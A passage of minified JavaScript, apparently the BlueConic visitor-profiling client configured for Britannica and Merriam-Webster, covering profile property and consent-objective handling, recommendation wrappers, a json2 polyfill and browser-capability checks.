      };
      this.isPositionTypePlugin = function () {
        return "position" === this._positionType;
      };
      this.getProfile = function () {
        return this._bcClient.profile.getProfile();
      };
      this.isLocalEditMode = function () {
        return this._isLocalEditMode;
      };
      this.getBlueConicClient = function () {
        this._bcClient || (this._bcClient = A.getBlueConicClient(this));
        return this._bcClient;
      };
      this.getConnection = function (a) {
        if (!a || !V || !c.isArray(V) || 0 === V.length) return null;
        for (var b = 0, d = V.length; b < d; b++) {
          var h = V[b];
          if (h && h.id && h.parameters && h.id === a) return b = c.getInteractionParameters(h), new Eb(a, b);
        }
        return null;
      };
      this.getGoals = function () {
        return wa ? wa[this._id] : null;
      };
    }
    function Ja(a) {
      function b(a) {
        a = c.ensureArray(a).join(",");
        S ? a ? localStorage.setItem("BCRefusedObjectives", a) : localStorage.removeItem("BCRefusedObjectives") : c.setCookie("BCRefusedObjectives", a, 31536E6);
      }
      this._id = a;
      this._properties = {};
      this.getId = function () {
        return this._id;
      };
      this.getPropertyNames = function () {
        var a = [],
          b;
        for (b in this._properties) y.call(a, b);
        return a;
      };
      this.getValue = function (a) {
        if (!ea.call(this._properties, a)) return E;
        a = this._properties[a];
        return c.isArray(a) ? a[0] : a;
      };
      this.getValues = function (a) {
        return ea.call(this._properties, a) ? c.ensureArray(this._properties[a]) : [];
      };
      this.setValue = function (a, b, f) {
        "consented_objectives" === a ? (b = c.isArray(b) ? 0 < b.length ? [b[0]] : [] : [b], this.setConsentedObjectives(b, f)) : "refused_objectives" === a ? (b = c.isArray(b) ? 0 < b.length ? [b[0]] : [] : [b], this.setRefusedObjectives(b, f)) : this._setValue(a, b, f);
      };
      this._setValue = function (a, b, f) {
        var d = this.profileIsPrivacyAware();
        a ? null === b || b === E ? l && c.logInfo("value cannot be undefined or null") : (t.unsavedLog(a, null), c.isArray(b) ? b = 0 < b.length ? b[0] : null : c.isDate(b) ? b = b.getTime() : c.isObject(b) && (b = c.stringifyObject(b)), t.unsavedLog(a, b, t.SET, d, f), this._properties[a] = c.ensureArray(b)) : l && c.logInfo("could not set value for undefined property");
      };
      this.setValues = function (a, b, c) {
        "consented_objectives" === a ? this.setConsentedObjectives(b, c) : "refused_objectives" === a ? this.setRefusedObjectives(b, c) : this._setValues(a, b, c);
      };
      this._setValues = function (a, b, f) {
        var d = this.profileIsPrivacyAware();
        if (a) {
          if (c.isArray(a)) l && c.logInfo("property cannot be an array");else {
            t.unsavedLog(a, null);
            b = c.ensureArray(b);
            for (var e = 0; e < b.length; e++) c.isDate(b[e]) ? b[e] = b[e].getTime() : c.isArray(b[e]) ? b[e] = 0 < b[e].length ? b[e][0] : null : c.isObject(b[e]) && (b[e] = c.stringifyObject(b[e]));
            c.removeItemFromArray(b, null);
            c.removeItemFromArray(b, E);
            this._properties[a] = b;
            t.unsavedLog(a, b, t.SET, d, f);
          }
        } else l && c.logInfo("could not set values for undefined property");
      };
      this.addValue = function (a, b, c) {
        "consented_objectives" === a ? this.addConsentedObjective(b, c) : "refused_objectives" === a ? this.addRefusedObjective(b, c) : this._addValue(a, b, c);
      };
      this._addValue = function (a, b, f) {
        var d = this.profileIsPrivacyAware();
        if (a) {
          if (c.isArray(a)) l && c.logInfo("property cannot be an array");else if (null === b || b === E) l && c.logInfo("value cannot be undefined or null");else {
            c.isDate(b) ? b = b.getTime() : c.isArray(b) ? b = 0 < b.length ? b[0] : null : c.isObject(b) && (b = c.stringifyObject(b));
            this._properties[a] || (this._properties[a] = []);
            var e = this._properties[a];
            -1 === c.indexOfArray(e, b) && (y.call(e, b), t.setQueue[a] ? t.unsavedLog(a, e, t.SET, d, f) : t.unsavedLog(a, b, t.ADD, d, f));
            this._properties[a] = e;
          }
        } else l && c.logInfo("could not add value for undefined property");
      };
      this.incrementValue = function (a, b, f) {
        var d = this.profileIsPrivacyAware();
        a ? c.isArray(a) ? l && c.logInfo("property cannot be an array") : null === b || b === E ? l && c.logInfo("value cannot be undefined or null") : (c.isArray(b) && (b = 0 < b.length ? b[0] : null), isNaN(b) ? l && c.logInfo("value must be a number") : (this._properties[a] || (this._properties[a] = []), t.unsavedLog(a, b, t.INCREMENT, d, f))) : l && c.logInfo("could not increment value for undefined property");
      };
      this.getPrivacyLegislation = function () {
        return this.getValue("privacy_legislation");
      };
      this.getConsentedObjectives = function () {
        return this.getValues("consented_objectives");
      };
      this.getRefusedObjectives = function () {
        return this._privacyAwareAndDoNotTrack() ? this.getDntRefusedObjectives() : this.getValues("refused_objectives");
      };
      this.setPrivacyLegislation = function (a, b) {
        this.setValue("privacy_legislation", a, b);
      };
      this.addConsentedObjective = function (a, b) {
        var d = this.getConsentedObjectives();
        -1 === c.indexOfArray(d, a) && this._addValue("consented_objectives", a, b);
        d = this.getRefusedObjectives();
        this._privacyAwareAndDoNotTrack() && (this._setValues("refused_objectives", d, b), this.deleteDntRefusedObjectives(), l && c.logInfo("Set permission level because of added consented objective: " + a), m.setLevel(m.PERSONAL, "Added consented objective: " + a));
      };
      this.addRefusedObjective = function (a, e) {
        if (this._privacyAwareAndDoNotTrack()) e = this.getDntRefusedObjectives(), -1 === c.indexOfArray(e, a) && y.call(e, a), b(e);else {
          var d = this.getRefusedObjectives();
          -1 === c.indexOfArray(d, a) && this._addValue("refused_objectives", a, e);
        }
      };
      this.setConsentedObjectives = function (a, b) {
        this._setValues("consented_objectives", a, b);
        if (0 !== a.length) {
          var d = this.getRefusedObjectives();
          this._privacyAwareAndDoNotTrack() && (this._setValues("refused_objectives", d, b), this.deleteDntRefusedObjectives(), l && c.logInfo("Set permission level because of consented objectives: " + a), m.setLevel(m.PERSONAL, "Set consented objectives: " + a));
        }
      };
      this.setRefusedObjectives = function (a, c) {
        this._privacyAwareAndDoNotTrack() ? b(a) : this._setValues("refused_objectives", a, c);
      };
      this.loadValues = function (a, b, f) {
        a = c.ensureArray(a);
        t.getProperties(a, this, function () {
          c.doCallback(b, f);
        });
        g.submitBatch();
      };
      this.addProperty = function (a, b) {
        c.logDeprecated("profile.addProperty(property, value)", "profile.addValue(property, value)");
        this.addValue(a, b);
      };
      this.getDntRefusedObjectives = function () {
        var a;
        return (a = S ? localStorage.getItem("BCRefusedObjectives") : c.getCookie("BCRefusedObjectives")) ? c.ensureArray(a.split(",")) : [];
      };
      this.deleteDntRefusedObjectives = function () {
        S ? localStorage.removeItem("BCRefusedObjectives") : c.setCookie("BCRefusedObjectives", null);
      };
      this._privacyAwareAndDoNotTrack = function () {
        return this.hasSupportedLegislation() && m.getLevel() === m.DO_NOT_TRACK;
      };
      this.hasSupportedLegislation = function () {
        var a = this.getPrivacyLegislation();
        return 0 <= c.indexOfArray(Ua, "REST_OF_WORLD") ? !0 : 0 <= c.indexOfArray(Ua, a);
      };
      this.profileIsPrivacyAware = function () {
        return !this.getPrivacyLegislation() || this.hasSupportedLegislation();
      };
    }
    function Y(a) {
      this.getId = function () {
        return q.getId();
      };
      this.getPropertyNames = function () {
        return q.getPropertyNames();
      };
      this.getValue = function (a) {
        return q.getValue(a);
      };
      this.getValues = function (a) {
        return q.getValues(a);
      };
      this.setValue = function (b, c) {
        q.setValue(b, c, a);
      };
      this.setValues = function (b, c) {
        q.setValues(b, c, a);
      };
      this.addValue = function (b, c) {
        q.addValue(b, c, a);
      };
      this.incrementValue = function (b, c) {
        q.incrementValue(b, c, a);
      };
      this.getPrivacyLegislation = function () {
        return q.getPrivacyLegislation();
      };
      this.getConsentedObjectives = function () {
        return q.getConsentedObjectives();
      };
      this.getRefusedObjectives = function () {
        return q.getRefusedObjectives();
      };
      this.setPrivacyLegislation = function (a, c) {
        q.setPrivacyLegislation(a, c);
      };
      this.addConsentedObjective = function (b) {
        q.addConsentedObjective(b, a);
      };
      this.addRefusedObjective = function (b) {
        q.addRefusedObjective(b, a);
      };
      this.setConsentedObjectives = function (b) {
        q.setConsentedObjectives(b, a);
      };
      this.setRefusedObjectives = function (b) {
        q.setRefusedObjectives(b, a);
      };
      this.loadValues = function (a, c, e) {
        q.loadValues(a, c, e);
      };
      this.addProperty = function (a, c) {
        q.addProperty(a, c);
      };
      this.isNew = function () {
        return Va;
      };
      this.getLifecycleStages = function () {
        return W;
      };
    }
    function Gb(a) {
      this._apiVersion = a && a.recommendationBlock ? 2 : 1;
      if (1 === this._apiVersion) this._id = a && 0 < a.length ? a[0].recommendationId[0] : null, this._items = a ? a : [];else {
        this._id = a.recommendationId;
        this._setsOrder = [];
        this._groupedItems = {};
        for (var b = v.util.array.ensureArray(a.recommendationBlock), c = 0; c < b.length; c++) for (var e = v.util.array.ensureArray(b[c].recommendations), f = 0; f < e.length; f++) {
          var h = b[c].id;
          e[f].recommendationId = this._id;
          e[f].setId = h;
          this._groupedItems[h] || (this._groupedItems[h] = [], this._setsOrder.push(h));
          this._groupedItems[h].push(e[f]);
        }
        this._trackingPixel = a.trackingPixel;
      }
      this.getId = function () {
        return this._id;
      };
      this.getAPIVersion = function () {
        return this._apiVersion;
      };
      this.getItems = function () {
        if (1 === this.getAPIVersion()) return this._items;
        for (var a = [], b = 0; b < this._setsOrder.length; b++) a = a.concat(this._groupedItems[this._setsOrder[b]]);
        return a;
      };
      this.getSetsOrder = function () {
        return this._setsOrder;
      };
      this.getGroupedItems = function () {
        return this._groupedItems;
      };
      this.getTrackingPixelUrl = function () {
        return this._trackingPixel;
      };
    }
    function Hb(a, b, c, e, f) {
      this._id = a;
      this._html = b;
      this._css = c;
      this._javascript = e;
      this._precompiledTemplate = f;
      this.getId = function () {
        return this._id;
      };
      this.getHtml = function () {
        return this._html;
      };
      this.getCss = function () {
        return this._css;
      };
      this.getJavaScript = function () {
        return this._javascript;
      };
      this.getPrecompiled = function () {
        return this._precompiledTemplate;
      };
    }
    function Ib(a, b, c) {
      this._id = a;
      this._title = b;
      this._description = c;
      this.getId = function () {
        return this._id;
      };
      this.getTitle = function () {
        return this._title;
      };
      this.getDescription = function () {
        return this._description;
      };
    }
    function Jb(a) {
      this._id = a;
      this.getId = function () {
        return this._id;
      };
    }
    function Kb(a, b) {
      this._id = a;
      this._name = b;
      this.getId = function () {
        return this._id;
      };
      this.getName = function () {
        return this._name;
      };
    }
    function Lb(a, b) {
      this._id = a;
      this._name = b;
      this.getId = function () {
        return this._id;
      };
      this.getName = function () {
        return this._name;
      };
    }
    function Mb(a, b) {
      this._lifecycle = a;
      this._stage = b;
      this.getLifecycle = function () {
        return this._lifecycle;
      };
      this.getStage = function () {
        return this._stage;
      };
    }
    function Nb() {
      l && c.logInfo("The browser has no JSON support; the json2 [http://www.JSON.org/js.html] is used for handling JSON");
      xa = {};
      (function (a) {
        function b(a) {
          return 10 > a ? "0" + a : a;
        }
        function c(a) {
          h.lastIndex = 0;
          return h.test(a) ? '"' + a.replace(h, function (a) {
            var b = n[a];
            return "string" === typeof b ? b : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
          }) + '"' : '"' + a + '"';
        }
        function e(a, b) {
          var d,
            f,
            h = p,
            n,
            g = b[a];
          g && "object" === typeof g && "function" === typeof g.bcToJSON && (g = g.bcToJSON(a));
          "function" === typeof z && (g = z.call(b, a, g));
          switch (typeof g) {
            case "string":
              return c(g);
            case "number":
              return isFinite(g) ? String(g) : "null";
            case "boolean":
            case "null":
              return String(g);
            case "object":
              if (!g) return "null";
              p += r;
              n = [];
              if ("[object Array]" === Object.prototype.toString.apply(g)) {
                f = g.length;
                for (a = 0; a < f; a += 1) n[a] = e(a, g) || "null";
                b = 0 === n.length ? "[]" : p ? "[\n" + p + n.join(",\n" + p) + "\n" + h + "]" : "[" + n.join(",") + "]";
                p = h;
                return b;
              }
              if (z && "object" === typeof z) for (f = z.length, a = 0; a < f; a += 1) "string" === typeof z[a] && (d = z[a], (b = e(d, g)) && n.push(c(d) + (p ? ": " : ":") + b));else for (d in g) Object.prototype.hasOwnProperty.call(g, d) && (b = e(d, g)) && n.push(c(d) + (p ? ": " : ":") + b);
              b = 0 === n.length ? "{}" : p ? "{\n" + p + n.join(",\n" + p) + "\n" + h + "}" : "{" + n.join(",") + "}";
              p = h;
              return b;
          }
        }
        "function" !== typeof Date.prototype.bcToJSON && (Date.prototype.bcToJSON = function (a) {
          return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + b(this.getUTCMonth() + 1) + "-" + b(this.getUTCDate()) + "T" + b(this.getUTCHours()) + ":" + b(this.getUTCMinutes()) + ":" + b(this.getUTCSeconds()) + "Z" : null;
        }, String.prototype.bcToJSON = Number.prototype.bcToJSON = Boolean.prototype.bcToJSON = function (a) {
          return this.valueOf();
        });
        var f = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
          h = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
          p,
          r,
          n = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\"
          },
          z;
        "function" !== typeof a.stringify && (a.stringify = function (a, b, c) {
          var d;
          r = p = "";
          if ("number" === typeof c) for (d = 0; d < c; d += 1) r += " ";else "string" === typeof c && (r = c);
          if ((z = b) && "function" !== typeof b && ("object" !== typeof b || "number" !== typeof b.length)) throw Error("JSON.stringify");
          return e("", {
            "": a
          });
        });
        "function" !== typeof a.parse && (a.parse = function (a, b) {
          function c(a, d) {
            var e,
              f,
              h = a[d];
            if (h && "object" === typeof h) for (e in h) Object.prototype.hasOwnProperty.call(h, e) && (f = c(h, e), f !== E ? h[e] = f : delete h[e]);
            return b.call(a, d, h);
          }
          a = String(a);
          f.lastIndex = 0;
          f.test(a) && (a = a.replace(f, function (a) {
            return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
          }));
          if (/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) return a = eval("(" + a + ")"), "function" === typeof b ? c({
            "": a
          }, "") : a;
          throw new SyntaxError("JSON.parse");
        });
      })(xa);
    }
    var Pb = L ? L : "FORCE_POST";
    var BC_URL = 'https://encyclopediabritannica.blueconic.net';
    var BC_HOSTNAME_MAP = {
      "786476000": "bc-script.britannica.com",
      "-1281159776": "bc-script.britannica.com",
      "1327732704": "binocule21c.merriam-webster.com",
      "182718944": "bc-script.britannica.com",
      "-523902976": "binocule21c.merriam-webster.com",
      "-1318688800": "bc-script.britannica.com",
      "-509059936": "bc-script.britannica.com",
      "-1527978336": "bc-script.britannica.com",
      "-2035543968": "binocule21c.merriam-webster.com",
      "135066112": "bc-script.britannica.com",
      "21855552": "bc-script.britannica.com",
      "430799136": "bc-script.britannica.com",
      "-1160806592": "bc-script.britannica.com",
      "412175360": "bc-script.britannica.com",
      "871580192": "bc-script.britannica.com",
      "-264958432": "bc-script.britannica.com",
      "416658816": "bc-script.britannica.com",
      "1073205664": "bc-script.britannica.com",
      "-1258632992": "bc-script.britannica.com",
      "1113325952": "bc-script.britannica.com",
      "-1006888224": "bc-script.britannica.com",
      "-337776000": "bc-script.britannica.com",
      "689792448": "bc-script.britannica.com",
      "1189052224": "binocule21c.merriam-webster.com",
      "868244384": "bc-script.britannica.com",
      "2097263648": "bc-script.britannica.com",
      "-2101217888": "bc-script.britannica.com",
      "-112994976": "bc-script.britannica.com",
      "-672642304": "bc-script.britannica.com",
      "1649008096": "bc-script.britannica.com",
      "1122776128": "bc-script.britannica.com",
      "-1676925088": "bc-script.britannica.com",
      "-1135654944": "bc-script.britannica.com",
      "-487615360": "bc-script.britannica.com",
      "-588235072": "bc-script.britannica.com",
      "-716002912": "bc-script.britannica.com",
      "-353110912": "bc-script.britannica.com",
      "1140089600": "bc-script.britannica.com",
      "1010215424": "bc-script.britannica.com",
      "-118023360": "bc-script.britannica.com",
      "-826737472": "bc-script.britannica.com",
      "-805534080": "bc-script.britannica.com",
      "324919328": "bc-script.britannica.com",
      "738036864": "bc-script.britannica.com",
      "-2004956352": "bc-script.britannica.com",
      "1304422528": "bc-script.britannica.com"
    };
    var ya = document.createElement("a");
    ya.href = BC_URL;
    X = -1 === ya.href.substring(ya.protocol.length).indexOf(":") ? ya.hostname : ya.host;
    var I = !1;
    if (k.name && 0 == k.name.indexOf("bc_") || top.window != k || document.cookie && -1 != document.cookie.indexOf("BC_e\x3dtrue")) if (k.top != k || k.opener) {
      I = !0;
      try {
        top.location.host != document.location.host || k.opener || (I = !1);
      } catch (a) {
        I = !0;
      }
    }
    if (!k.blueConicClient || -1 == BC_URL.indexOf(X)) {
      var jb = function () {
          if (I) return BC_URL;
          var a = "undefined" != typeof X ? "https://" + X : null;
          a && -1 != BC_URL.indexOf(X.split(":")[0].replace("http://", "")) || (a = BC_URL);
          if (!a) a: {
            var b;
            b = document.getElementsByTagName("script");
            for (var c = 0, e = b.length; c < e; c++) if (a = b[c], (a = a.getAttribute("src")) && -1 !== a.indexOf("/blueconic/blueconic")) {
              b = document.createElement("a");
              b.href = a;
              a = "https://" + b.host;
              break a;
            }
            a = void 0;
          }
          return a;
        },
        kb = jb(),
        J = "undefined" != typeof ua && ua ? ua : null,
        lb = function () {
          var a = k.navigator.userLanguage || navigator.systemLanguage || k.navigator.language;
          if (!a) return null;
          var b = -1 !== a.indexOf("-") ? a.indexOf("-") : a.indexOf("_");
          -1 != b && (a = a.substring(0, b));
          return a = a.toLowerCase();
        },
        R = lb.call(this),
        Qb = new Date().getTime(),
        l = "undefined" != typeof gb && gb,
        T = "undefined" != typeof console && console && console.log,
        ga = !1,
        mb = !1,
        Wa = !1,
        ha = [],
        Rb = ["LISTENER", "TOOLBAR"],
        ra = !1,
        za = !1,
        Aa = !1,
        Xa = null,
        Ua = [],
        Ya = null,
        Ba;
      Ba = k.navigator && k.navigator.userAgent ? navigator.userAgent.toLowerCase() : "unknown";
      var Sb = function () {
          try {
            var a;
            document.createEvent ? (a = document.createEvent("Event"), a.initEvent("onBlueConicEventCheck", !0, !0), k.dispatchEvent(a)) : (a = document.createEventObject(), k.fireEvent("onBlueConicEventCheck", a));
            return !0;
          } catch (b) {
            return !1;
          }
        }(),
        Tb = function () {
          if ("undefined" != typeof XMLHttpRequest && XMLHttpRequest) {
            if ("withCredentials" in new XMLHttpRequest()) return l && T && console.log("CORS is fully supported. Chrome/Firefox/Opera/Safari/IE10+"), !0;
            if ("undefined" != typeof XDomainRequest) return l && T && console.log("CORS is not fully supported in IE8/9, fallback to old GET mechanism."), !1;
          }
          l && T && console.log("CORS is not supported.");
          return !1;
        }(),
        S;
      try {
        localStorage.setItem("bc_local_storage_check", "bc_local_storage_check"), localStorage.removeItem("bc_local_storage_check"), S = !0;
      } catch (a) {
        S = !1;
      }
      var Ca = !0,
        Za = null,
        U = !0,
        nb = !1,
        Da = function () {
          if (k.navigator && k.navigator.vendor && -1 !== k.navigator.vendor.toLowerCase().indexOf("apple") || -1 !== Ba.indexOf("safari/")) U = !1;
          return -1 !== Ba.indexOf("firefox") ? (-1 !== Ba.indexOf("gecko/") && (U = !1), 7168) : -1 !== Ba.indexOf("chrome") ? (U = !0, 7168) : 3072;
        }();
      N !== E && (U = U ? N : !1, l && T && console.log("Cookie sync is toggled by configuration: " + U));
      var xa = null,
        ob = Object.prototype.toString,
        ea = Object.prototype.hasOwnProperty,
        y = Array.prototype.push,
        Ub = Array.prototype.unshift,
        pb = Array.prototype.indexOf,
        Vb = Array.prototype.isArray,
        Wb = Array.prototype.filter,
        Xb = Array.prototype.map,
        ia = null,
        Ea = null,
        qb = !1,
        Fa;
      try {
        ia = document.cookie, Fa = !0;
      } catch (a) {
        Fa = !1;
      }
      for (var rb = null, sb = null, $a = null, K = [], ja = [], W = [], wa = null, V = [], ka = null, q = null, Va = !1, Ka = null, La = null, Oa = null, Ga = [], ab = {}, bb = {}, Pa = {}, ca = {}, tb = {}, cb = "bc_pre_" + new Date().getTime(), ub = "bc_post_" + new Date().getTime(), Qa = "bc_async_" + new Date().getTime(), da = hb ? hb : [], vb = !1, wb = ["bc_simulator", "bc_dialogues", "bc_visualpicker"], xb = "ArrayBuffer Attr Audio AudioProcessingEvent BCClass BeforeLoadEvent Blob CDATASection CSSCharsetRule CSSFontFaceRule CSSImportRule CSSMediaRule CSSPageRule CSSPrimitiveValue CSSRule CSSRuleList CSSStyleDeclaration CSSStyleRule CSSStyleSheet CSSValue CSSValueList CanvasGradient CanvasPattern CanvasRenderingContext2D CharacterData ClientRect ClientRectList Clipboard CloseEvent Comment CompositionEvent Counter CustomEvent DOMException DOMImplementation DOMParser DOMSettableTokenList DOMStringList DOMStringMap DOMTokenList DataView DeviceOrientationEvent Document DocumentFragment DocumentType Element Entity EntityReference ErrorEvent Event EventException EventSource File FileError FileList FileReader Float32Array Float64Array FormData HTMLAllCollection HTMLAnchorElement HTMLAppletElement HTMLAreaElement HTMLAudioElement HTMLBRElement HTMLBaseElement HTMLBaseFontElement HTMLBodyElement HTMLButtonElement HTMLCanvasElement HTMLCollection HTMLDListElement HTMLDirectoryElement HTMLDivElement HTMLDocument HTMLElement HTMLEmbedElement HTMLFieldSetElement HTMLFontElement HTMLFormElement HTMLFrameElement HTMLFrameSetElement HTMLHRElement HTMLHeadElement HTMLHeadingElement HTMLHtmlElement HTMLIFrameElement HTMLImageElement HTMLInputElement HTMLKeygenElement HTMLLIElement HTMLLabelElement HTMLLegendElement HTMLLinkElement HTMLMapElement HTMLMarqueeElement HTMLMediaElement HTMLMenuElement HTMLMetaElement HTMLMeterElement HTMLModElement HTMLOListElement HTMLObjectElement HTMLOptGroupElement HTMLOptionElement HTMLOutputElement HTMLParagraphElement HTMLParamElement HTMLPreElement HTMLProgressElement HTMLQuoteElement HTMLScriptElement HTMLSelectElement HTMLSourceElement HTMLSpanElement HTMLStyleElement HTMLTableCaptionElement HTMLTableCellElement HTMLTableColElement HTMLTableElement HTMLTableRowElement HTMLTableSectionElement HTMLTextAreaElement HTMLTitleElement HTMLUListElement HTMLUnknownElement HTMLVideoElement HashChangeEvent IceCandidate Image ImageData Int16Array Int32Array Int8Array KeyboardEvent MediaController MediaError MediaList MediaStreamEvent MessageChannel MessageEvent MessagePort MimeType MimeTypeArray MouseEvent MutationEvent NamedNodeMap Node NodeFilter NodeList Notation OfflineAudioCompletionEvent Option OverflowEvent PERSISTENT PageTransitionEvent Plugin PluginArray PopStateEvent ProcessingInstruction ProgressEvent RGBColor Range RangeException Rect SQLException SVGAElement SVGAltGlyphDefElement SVGAltGlyphElement SVGAltGlyphItemElement SVGAngle SVGAnimateColorElement SVGAnimateElement SVGAnimateMotionElement SVGAnimateTransformElement SVGAnimatedAngle SVGAnimatedBoolean SVGAnimatedEnumeration SVGAnimatedInteger SVGAnimatedLength SVGAnimatedLengthList SVGAnimatedNumber SVGAnimatedNumberList SVGAnimatedPreserveAspectRatio SVGAnimatedRect SVGAnimatedString SVGAnimatedTransformList SVGCircleElement SVGClipPathElement SVGColor SVGComponentTransferFunctionElement SVGCursorElement SVGDefsElement SVGDescElement SVGDocument SVGElement SVGElementInstance SVGElementInstanceList SVGEllipseElement SVGException SVGFEBlendElement SVGFEColorMatrixElement SVGFEComponentTransferElement SVGFECompositeElement SVGFEConvolveMatrixElement SVGFEDiffuseLightingElement SVGFEDisplacementMapElement SVGFEDistantLightElement SVGFEDropShadowElement SVGFEFloodElement SVGFEFuncAElement SVGFEFuncBElement SVGFEFuncGElement SVGFEFuncRElement SVGFEGaussianBlurElement SVGFEImageElement SVGFEMergeElement SVGFEMergeNodeElement SVGFEMorphologyElement SVGFEOffsetElement SVGFEPointLightElement SVGFESpecularLightingElement SVGFESpotLightElement SVGFETileElement SVGFETurbulenceElement SVGFilterElement SVGFontElement SVGFontFaceElement SVGFontFaceFormatElement SVGFontFaceNameElement SVGFontFaceSrcElement SVGFontFaceUriElement SVGForeignObjectElement SVGGElement SVGGlyphElement SVGGlyphRefElement SVGGradientElement SVGHKernElement SVGImageElement SVGLength SVGLengthList SVGLineElement SVGLinearGradientElement SVGMPathElement SVGMarkerElement SVGMaskElement SVGMatrix SVGMetadataElement SVGMissingGlyphElement SVGNumber SVGNumberList SVGPaint SVGPathElement SVGPathSeg SVGPathSegArcAbs SVGPathSegArcRel SVGPathSegClosePath SVGPathSegCurvetoCubicAbs SVGPathSegCurvetoCubicRel SVGPathSegCurvetoCubicSmoothAbs SVGPathSegCurvetoCubicSmoothRel SVGPathSegCurvetoQuadraticAbs SVGPathSegCurvetoQuadraticRel SVGPathSegCurvetoQuadraticSmoothAbs SVGPathSegCurvetoQuadraticSmoothRel SVGPathSegLinetoAbs SVGPathSegLinetoHorizontalAbs SVGPathSegLinetoHorizontalRel SVGPathSegLinetoRel SVGPathSegLinetoVerticalAbs SVGPathSegLinetoVerticalRel SVGPathSegList SVGPathSegMovetoAbs SVGPathSegMovetoRel SVGPatternElement SVGPoint SVGPointList SVGPolygonElement SVGPolylineElement SVGPreserveAspectRatio SVGRadialGradientElement SVGRect SVGRectElement SVGRenderingIntent SVGSVGElement SVGScriptElement SVGSetElement SVGStopElement SVGStringList SVGStyleElement SVGSwitchElement SVGSymbolElement SVGTRefElement SVGTSpanElement SVGTextContentElement SVGTextElement SVGTextPathElement SVGTextPositioningElement SVGTitleElement SVGTransform SVGTransformList SVGUnitTypes SVGUseElement SVGVKernElement SVGViewElement SVGZoomEvent Selection SessionDescription SharedWorker SpeechInputEvent Storage StorageEvent StyleSheet StyleSheetList TEMPORARY Text TextEvent TextMetrics TimeRanges TouchEvent UIEvent URL Uint16Array Uint32Array Uint8Array Uint8ClampedArray WebGLActiveInfo WebGLBuffer WebGLContextEvent WebGLFramebuffer WebGLProgram WebGLRenderbuffer WebGLRenderingContext WebGLShader WebGLTexture WebGLUniformLocation WebKitAnimationEvent WebKitBlobBuilder WebKitCSSFilterValue WebKitCSSKeyframeRule WebKitCSSKeyframesRule WebKitCSSMatrix WebKitCSSRegionRule WebKitCSSTransformValue WebKitIntent WebKitMutationObserver WebKitPoint WebKitTransitionEvent WebSocket WheelEvent Window Worker XMLDocument XMLHttpRequest XMLHttpRequestException XMLHttpRequestProgressEvent XMLHttpRequestUpload XMLSerializer XPathEvaluator XPathException XPathResult XSLTProcessor addEventListener alert applicationCache atob bcHostname bcVerbose blueConicClient blueConicPreListeners blur btoa caches cancelAnimationFrame cancelIdleCallback captureEvents chrome clearInterval clearTimeout clientInformation close closed confirm console content controllers createImageBitmap crypto customElements defaultStatus defaultstatus devicePixelRatio disableExternalCapture dispatchEvent document enableExternalCapture event external fetch find focus forward frameElement frames fullScreen getComputedStyle getMatchedCSSRules getSelection globalStorage history home indexedDB innerHeight innerWidth isSecureContext length localStorage location locationbar matchMedia menubar moveBy moveTo mozAnimationStartTime mozCancelAnimationFrame mozCancelRequestAnimationFrame mozIndexedDB mozInnerScreenX mozInnerScreenY mozPaintCount mozRequestAnimationFrame myVar name navigator offscreenBuffering onabort onafterprint onafterscriptexecute onanimationend onanimationiteration onanimationstart onappinstalled onauxclick onbeforeinstallprompt onbeforeprint onbeforescriptexecute onbeforeunload onblur oncancel oncanplay oncanplaythrough onchange onclick onclose oncontextmenu oncopy oncuechange oncut ondblclick ondevicemotion ondeviceorientation ondeviceorientationabsolute ondrag ondragend ondragenter ondragleave ondragover ondragstart ondrop ondurationchange onemptied onended onerror onfocus ongotpointercapture onhashchange oninput oninvalid onkeydown onkeypress onkeyup onlanguagechange onload onloadeddata onloadedmetadata onloadstart onlostpointercapture onmessage onmessageerror onmousedown onmouseenter onmouseleave onmousemove onmouseout onmouseover onmouseup onmousewheel onmozfullscreenchange onmozfullscreenerror onoffline ononline onpagehide onpageshow onpaste onpause onplay onplaying onpointercancel onpointerdown onpointerenter onpointerleave onpointermove onpointerout onpointerover onpointerup onpopstate onprogress onratechange onrejectionhandled onreset onresize onscroll onsearch onseeked onseeking onselect onshow onstalled onstorage onsubmit onsuspend ontimeupdate ontoggle ontouchcancel ontouchend ontouchmove ontouchstart ontransitionend onunhandledrejection onunload onvolumechange onwaiting onwebkitanimationend onwebkitanimationiteration onwebkitanimationstart onwebkittransitionend onwheel open openDatabase openDialog opener origin outerHeight outerWidth pageXOffset pageYOffset parent performance personalbar pkcs11 postMessage print prompt releaseEvents removeEventListener requestAnimationFrame requestIdleCallback resizeBy resizeTo routeEvent screen screenLeft screenTop screenX screenY scroll scrollBy scrollByLines scrollByPages scrollMaxX scrollMaxY scrollTo scrollX scrollY scrollbars self sessionStorage setInterval setResizable setTimeout showModalDialog sizeToContent speechSynthesis status statusbar stop styleMedia toolbar top updateCommands v8Locale visualViewport webkitAudioContext webkitAudioPannerNode webkitCancelAnimationFrame webkitCancelRequestAnimationFrame webkitConvertPointFromNodeToPage webkitConvertPointFromPageToNode webkitIDBCursor webkitIDBDatabase webkitIDBDatabaseError webkitIDBDatabaseException webkitIDBFactory webkitIDBIndex webkitIDBKeyRange webkitIDBObjectStore webkitIDBRequest webkitIDBTransaction webkitIndexedDB webkitNotifications webkitPostMessage webkitRequestAnimationFrame webkitRequestFileSystem webkitResolveLocalFileSystemURL webkitStorageInfo webkitURL window".split(" "), la = {}, db = 0; db < xb.length; db++) la[xb[db]] = null;
      var eb = k.BOOMR || k.dT_ ? ["$", "jQuery"] : ["$"],
        sa,
        u = function () {
          if (!kb) return l && c.logInfo("blueconic stopped running because the hostname is not defined"), null;
        };
      u.prototype.createEvent = function (a, b, d, e, f) {
        var h = -1 < c.indexOfArray(w.dynamicTypes, a),
